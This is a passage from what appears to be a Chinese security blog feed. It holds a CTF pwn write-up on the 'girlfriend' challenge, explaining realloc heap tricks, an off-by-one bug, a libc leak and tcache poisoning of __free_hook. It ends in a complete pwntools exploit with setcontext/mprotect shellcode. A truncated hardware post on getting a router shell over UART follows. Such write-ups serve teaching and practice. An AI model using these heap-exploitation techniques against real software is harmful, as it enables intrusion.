src="/2022/01/25/%E4%BB%8E%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF-girlfriend%E4%B8%AD%E7%9C%8Brealloc%E7%9A%84%E8%89%BA%E6%9C%AF/6.png" class=""><p>之后便进入<code>heap()</code>也就是堆的菜单，除了<code>New Paper</code>和<code>exit</code>之外还有两个选项，这个待会再看：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">heap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      meun();</span><br><span class="line">      <span class="comment">// puts(&quot;1. New Paper&quot;);</span></span><br><span class="line">      <span class="comment">// puts(&quot;2. exit&quot;);</span></span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)read_0();</span><br><span class="line">      <span class="keyword">if</span> ( (_DWORD)result == <span class="number">2</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt; <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (_DWORD)result != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      alloc();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">4</span> )</span><br><span class="line">      show();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">LABEL_11:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invaild&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>exit</code>就没什么好看的了，看看<code>New Paper</code>，可以获得到的信息是：</p><ul><li>只能分配16个堆块，也就是说得再16次以内完成堆叠，实现修改<code>fd</code>指针</li><li><code>chunk</code>的<code>size</code>受限，不过问题不是很大，但需要注意的是有个<code>!chunk_ptr</code>，按照刚刚的路走过来并没有分配堆块会导致退出：</li></ul><img src="/2022/01/25/%E4%BB%8E%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF-girlfriend%E4%B8%AD%E7%9C%8Brealloc%E7%9A%84%E8%89%BA%E6%9C%AF/7.png" class=""><ul><li>输入的<code>size</code>为<code>size + 1</code>，存在人为<code>off-by-one</code>漏洞</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">alloc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = chunk_num;</span><br><span class="line">  <span class="keyword">if</span> ( chunk_num &lt;= <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">    size = read_0();</span><br><span class="line">    <span class="keyword">if</span> ( size &gt; <span class="number">768</span> || size &lt; <span class="number">0</span> || !chunk_prt )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    *chunk_prt = <span class="built_in">realloc</span>(*chunk_prt, size);</span><br><span class="line">    <span class="keyword">if</span> ( *chunk_prt )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( size )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;data&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, *chunk_prt, size + <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    result = ++chunk_num;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过上面的信息会发现如果题目在询问<code>Do you have grilfriend ? </code>的时候选择<code>N</code>（78的<code>ascii</code>码）是不能正常进入题目的，出题人还是很好心的😀，既然这样就换一条路，可以看到选择<code>Y</code>之后，它分配了0x200的堆块并赋值给了<code>chunk_ptr</code>，也就是说，现在可以成功进入题目了！但是很遗憾，<code>libc</code>的泄露泡汤了….，不要灰心，还有两个选项呢！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v1 != <span class="number">89</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;invaild&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">chunk_prt = <span class="built_in">malloc</span>(<span class="number">0x200</span>uLL);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;please buy gifts for her+++++&quot;</span>);</span><br><span class="line">result = heap();</span><br></pre></td></tr></table></figure><p>选项3是<code>return</code>回去，回去之后发现<code>for ( i = 0; i &lt;= 1; ++i )</code>，<code>i</code>的循环次数为2，也就是说<code>return</code>回去并没有让程序退出，而是给了一个重新选择的机会！所以只要两个选项都选择一次，就能泄露<code>libc</code>并且正常进入题目！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( result == <span class="number">3</span> )</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><p>这个函数其实就是<code>show</code>函数，并且有且仅有一次机会</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_CE8</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( dword_20204C &gt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;no chance&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(chunk_prt);</span><br><span class="line">  <span class="keyword">return</span> ++dword_20204C;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>泄露<code>libc</code>的任务已经完成，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">&#x27;Do you have grilfriend ? \n\n\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;89&#x27;</span>)</span><br><span class="line">backdoor()</span><br><span class="line">io.sendline(<span class="string">&#x27;78&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;%11a&#x27;</span>)<span class="comment">//和%a是一个道理</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;0x0.0&#x27;</span>)</span><br><span class="line">libc_base = <span class="keyword">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)<span class="number">-0x3ec7e3</span></span><br><span class="line">print(<span class="string">&quot;[*] libc_base =&gt; &quot;</span>+hex(libc_base))</span><br></pre></td></tr></table></figure><p>那接下来就是实现堆叠劫持<code>fd</code>指针，先<code>add</code>三个堆块，之前也讲到因为<code>realloc</code>的特性，所以必须<code>free</code>掉，否则将不能再把之前的堆块放入<code>bin</code>中，堆块的分布如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0xf8</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0x128</span>,<span class="string">&#x27;2&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0x300</span>,<span class="string">&#x27;3&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">free()</span><br></pre></td></tr></table></figure><img src="/2022/01/25/%E4%BB%8E%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF-girlfriend%E4%B8%AD%E7%9C%8Brealloc%E7%9A%84%E8%89%BA%E6%9C%AF/8.png" class=""><p>接下来申请0xf8的大小，由于比之前的大，所以会从堆块中查找可用的堆块，查找到0x100就分配出去了，同时<code>add</code>的时候存在<code>off-by-one</code>覆盖下个<code>chunk</code>的<code>size</code>为0x171，虽然后面的堆块识别不到了，但是无伤大雅</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xf8</span>+<span class="string">&quot;\x71&quot;</span>)</span><br><span class="line">free()</span><br></pre></td></tr></table></figure><img src="/2022/01/25/%E4%BB%8E%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF-girlfriend%E4%B8%AD%E7%9C%8Brealloc%E7%9A%84%E8%89%BA%E6%9C%AF/9.png" class=""><p>接下来<code>add(0x128)</code>就会分配到之前的堆块然后再分配到之前被<code>off-by-one</code>的堆块，再次进行扩大就能控制到下个堆块的内容，如下表：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x128</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0x160</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x120</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+p64(free_hook))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/200gx 0x56237735e270</span><br><span class="line">0x56237735e270:0x61616161616161610x0000000000000171</span><br><span class="line">0x56237735e280:0x61616161616161610x6161616161616161</span><br><span class="line">0x56237735e290:0x61616161616161610x6161616161616161</span><br><span class="line">0x56237735e2a0:0x61616161616161610x6161616161616161</span><br><span class="line">0x56237735e2b0:0x61616161616161610x6161616161616161</span><br><span class="line">0x56237735e2c0:0x61616161616161610x6161616161616161</span><br><span class="line">0x56237735e2d0:0x61616161616161610x6161616161616161</span><br><span class="line">0x56237735e2e0:0x61616161616161610x6161616161616161</span><br><span class="line">0x56237735e2f0:0x61616161616161610x6161616161616161</span><br><span class="line">0x56237735e300:0x61616161616161610x6161616161616161</span><br><span class="line">0x56237735e310:0x61616161616161610x6161616161616161</span><br><span class="line">0x56237735e320:0x61616161616161610x6161616161616161</span><br><span class="line">0x56237735e330:0x61616161616161610x6161616161616161</span><br><span class="line">0x56237735e340:0x61616161616161610x6161616161616161</span><br><span class="line">0x56237735e350:0x61616161616161610x6161616161616161</span><br><span class="line">0x56237735e360:0x61616161616161610x6161616161616161</span><br><span class="line">0x56237735e370:0x61616161616161610x6161616161616161</span><br><span class="line">0x56237735e380:0x61616161616161610x6161616161616161</span><br><span class="line">0x56237735e390:0x61616161616161610x6161616161616161</span><br><span class="line">0x56237735e3a0:0x00000000000000000x0000000000000111</span><br><span class="line">0x56237735e3b0:0x00007f9854f008e80x000056237735d010//free_hook</span><br><span class="line">0x56237735e3c0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>当再次<code>free</code>的时候，它就会进入<code>tache</code>，并且它的<code>fd</code>为<code>__free_hook</code>，如下图：</p><img src="/2022/01/25/%E4%BB%8E%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF-girlfriend%E4%B8%AD%E7%9C%8Brealloc%E7%9A%84%E8%89%BA%E6%9C%AF/10.png" class=""><p>再分配俩0x200的堆块就能够修改<code>__free_hook</code>，接下来的<code>orw</code>就是常规操作了，由于本文是聚焦<code>realloc</code>，就不做过多的介绍了，完整exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;girlfriend&#x27;</span>)<span class="comment">#,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment"># io = process(&#x27;girlfriend&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;girlfriend&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content=<span class="string">&#x27;zyen&#x27;</span></span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;size&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&#x27;data&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>():</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;size&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Do you have grilfriend ? \n\n\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;89&#x27;</span>)</span><br><span class="line">backdoor()</span><br><span class="line">io.sendline(<span class="string">&#x27;78&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;%11a&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;0x0.0&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x3ec7e3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] libc_base =&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] free_hook =&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] setcontext =&gt; &quot;</span>+<span class="built_in">hex</span>(setcontext))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0x128</span>,<span class="string">&#x27;2&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">&#x27;3&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xf8</span>+<span class="string">&quot;\x71&quot;</span>)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x128</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0x160</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x120</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+p64(free_hook))</span><br><span class="line">free()</span><br><span class="line">gdb.attach(io)</span><br><span class="line">add(<span class="number">0x200</span>)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">shellcode = free_hook &amp; <span class="number">0xfffffffffffff000</span></span><br><span class="line">shell1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rdi, rdi</span></span><br><span class="line"><span class="string">mov rsi, %d</span></span><br><span class="line"><span class="string">mov edx, 0x1000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov eax, 0; </span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">jmp rsi</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> % shellcode</span><br><span class="line"></span><br><span class="line">mprotect=libc_base+libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">payload = p64(setcontext+<span class="number">53</span>) + p64(free_hook + <span class="number">0x10</span>) + asm(shell1)</span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload+=p64(shellcode)<span class="comment">#rdi</span></span><br><span class="line">payload+=p64(<span class="number">0x1000</span>)<span class="comment">#rsi</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload+=p64(<span class="number">4</span> | <span class="number">2</span> | <span class="number">1</span>)<span class="comment">#rdx</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload+=p64(free_hook+<span class="number">8</span>)</span><br><span class="line">payload+=p64(mprotect)</span><br><span class="line">add(<span class="number">0x200</span>,payload)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">shell2=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov  rax,0x67616c662f2e</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov  rdi,rsp</span></span><br><span class="line"><span class="string">mov  rsi,0x0</span></span><br><span class="line"><span class="string">xor  rdx,rdx</span></span><br><span class="line"><span class="string">mov  rax,0x2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov  rdi,rax</span></span><br><span class="line"><span class="string">mov  rsi,rsp</span></span><br><span class="line"><span class="string">mov  rdx,1024</span></span><br><span class="line"><span class="string">mov  rax,0x0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov  rdi,0x1</span></span><br><span class="line"><span class="string">mov  rsi,rsp</span></span><br><span class="line"><span class="string">mov  rdx,rax</span></span><br><span class="line"><span class="string">mov  rax,0x1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">io.sendline(asm(shell2))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>本文感觉写的还是比较粗糙，有问题欢迎大师傅们来指正，以前总对<code>realloc</code>的堆风水布置感到有点迷茫，甚至觉得它就是玄学出来的，但其实完整的看看它的源码就会发现，其实每一步的结果都是和源码息息相关的，最后感谢您看到这，如果您看到这，相信你对<code>realloc</code>也有一定的理解了！！！</p><p>参考链接：</p><p><a href="https://r1nd0.github.io/2021/10/14/%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%9B%A2%E9%98%9F%E8%B5%9Bpwn-wp/">广东省强网杯团队赛pwn</a></p><span id="more"></span><p>本文由<strong>12138</strong>原创发布<br>转载，请参考<a href="https://www.anquanke.com/note/repost">转载声明</a>，注明出处： <a href="https://www.anquanke.com/post/id/254520">https://www.anquanke.com/post/id/254520</a><br>安全客 - 有思想的安全新媒体</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -CTF小知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何从串口获取到设备的shell？</title>
      <link href="/2022/01/25/%E5%A6%82%E4%BD%95%E4%BB%8E%E4%B8%B2%E5%8F%A3%E8%8E%B7%E5%8F%96%E5%88%B0%E8%AE%BE%E5%A4%87%E7%9A%84shell%EF%BC%9F/"/>
      <url>/2022/01/25/%E5%A6%82%E4%BD%95%E4%BB%8E%E4%B8%B2%E5%8F%A3%E8%8E%B7%E5%8F%96%E5%88%B0%E8%AE%BE%E5%A4%87%E7%9A%84shell%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<blockquote><p>当一个设备没有telnet，没有ftp，没有ssh，那我们怎么获取到此设备的调试能力呢？拆！</p></blockquote><h2 id="UART接口"><a href="#UART接口" class="headerlink" title="UART接口"></a>UART接口</h2><p>拆开设备，绿的一块黑的一块，第一次看确实有点无从下手，别慌，仔细在板子上寻找连着的3个口或者4个口，很容易就能找到它—-UART，UART是个什么玩意儿呢？ UART的全称为<code>Universal Asynchronous Receiver/Transmitter</code>，中文名字叫通用异步传输收发传送器，它充其量就是一个设备之间的传输协议，那何为异步呢？在介绍异步传输的时候，先来看看同步传输：</p><p>下面是SPI（Serial Peripheral Interface）的通信模型，有一条SCK时钟控制线，来进行进行数据传输时的同步，这就是同步的含义！</p><ul><li><a href="https://zhuanlan.zhihu.com/p/27376153">SPI协议（上）——基础介绍</a></li><li><a href="https://zhuanlan.zhihu.com/p/27462822">SPI协议（中）——通讯过程时序</a></li><li><a href="https://zhuanlan.zhihu.com/p/27489167">SPI协议（下）——读写串行FLASH实验</a></li></ul><img src="/2022/01/25/%E5%A6%82%E4%BD%95%E4%BB%8E%E4%B8%B2%E5%8F%A3%E8%8E%B7%E5%8F%96%E5%88%B0%E8%AE%BE%E5%A4%87%E7%9A%84shell%EF%BC%9F/8.png" class=""><p>回头来看，异步就是没有时钟信号来同步发送端和接收端，用通俗一点的话来说就是发送端可以在任何时候向接收端发送数据，什么意思呢？我们思考在Windows下进行键盘输入这个例子，我们什么时候按下键盘，操作系统是不会知道的，当我们按下某个键的时候，比如按下z，键盘就会往消息队列发送消息也就是z的ascii码，这就是异步传输！</p><p>那它是怎么知道一个消息的开头的呢？答：<strong>Start Bit</strong>会告诉它，不传输数据的时候它保持高电平，当开始传输的时候，它将拉低电平通知设备准备接收数据，在结束的时候拉高电平，也就是<strong>Stop Bits</strong>，可问题又来了，它不与设备同步，那接收数据的时候怎么知道传输的速率是多少呢？答：波特率，当设备接收到电平从高电平向低电平跃迁的时候，就以波特率所对应的频率进行接收数据（波特率是事先就设置好的）</p><p>下图后面两位分别是奇偶校验，校验的方法和TCP/IP协议里的奇偶校验一样，不做赘述，<code>stop bit</code>则是将低电平拉高到高电平的信号，具体可以参考下面的链接：</p><p><a href="https://www.analog.com/cn/analog-dialogue/articles/uart-a-hardware-communication-protocol.html">UART：了解通用异步接收器/发送器的硬件通信协议</a></p><p><a href="https://www.allaboutcircuits.com/technical-articles/back-to-basics-the-universal-asynchronous-receiver-transmitter-uart/">回归基础：通用异步接收器/发送器 (UART)</a></p><p><a href="https://blog.51cto.com/edges/143223">总算有点眉目了：同步传输与异步传输</a></p><p>数据包结构图：</p><img src="/2022/01/25/%E5%A6%82%E4%BD%95%E4%BB%8E%E4%B8%B2%E5%8F%A3%E8%8E%B7%E5%8F%96%E5%88%B0%E8%AE%BE%E5%A4%87%E7%9A%84shell%EF%BC%9F/1.png" class=""><p>介绍完了UART，来讲讲为什么要找到它，其实刚刚已经讲了一半出来—-它是与设备进行通信的接口，我们想得到设备的shell，那必然要跟它进行通信，UART就扮演着这么个角色，如果你要问为什么会留下这样的一个接口给我们拿shell呢？答案也很明了，即开发人员也是要调试的😀！所以就留下这么一个接口</p><h2 id="寻找UART接口"><a href="#寻找UART接口" class="headerlink" title="寻找UART接口"></a>寻找UART接口</h2><p>下图是TP-LINK TL-WR841N路由器的UART示意图（红色框框里面的就是），有几种方法可以定位UART在哪：</p><ul><li>有些板子上直接印有字</li><li>拿手电筒照一下板子</li><li>试着用万用表测一下</li></ul><img src="/2022/01/25/%E5%A6%82%E4%BD%95%E4%BB%8E%E4%B8%B2%E5%8F%A3%E8%8E%B7%E5%8F%96%E5%88%B0%E8%AE%BE%E5%A4%87%E7%9A%84shell%EF%BC%9F/2.jpg" class=""><p>找到之后，那么这四个口是什么东西呢？这就需要用到万用表来测试了！</p><h3 id="GND"><a href="#GND" class="headerlink" 